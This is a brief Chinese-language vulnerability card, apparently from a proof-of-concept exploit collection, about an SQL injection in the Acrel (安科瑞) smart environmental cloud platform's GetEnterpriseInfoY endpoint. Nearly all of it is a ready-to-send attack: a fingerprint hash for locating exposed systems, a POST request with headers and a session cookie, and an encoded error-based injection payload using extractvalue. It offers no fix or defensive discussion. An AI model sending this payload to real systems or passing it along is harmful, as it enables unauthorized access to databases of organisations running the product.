# 安科瑞-智能环保云平台getenterpriseinfoy存在SQL注入漏洞

- **系统**：安科瑞-智能环保云平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-1201212481"`
- **请求**：`POST /MainMonitor/GetEnterpriseInfoY HTTP/2`
- **关键头**：`Cookie: ASP.NET_SessionId=lxotqctrjrqyuqlhbjkxddpd`　`Sec-Fetch-User: ?1`　`Priority: u=0, i`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 125`

**请求体 / payload**
```
EnterpriseId=2107265665700008%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cmd5%28123456%29%29%29and%27&Type=4
```
- **预期**：200　|　—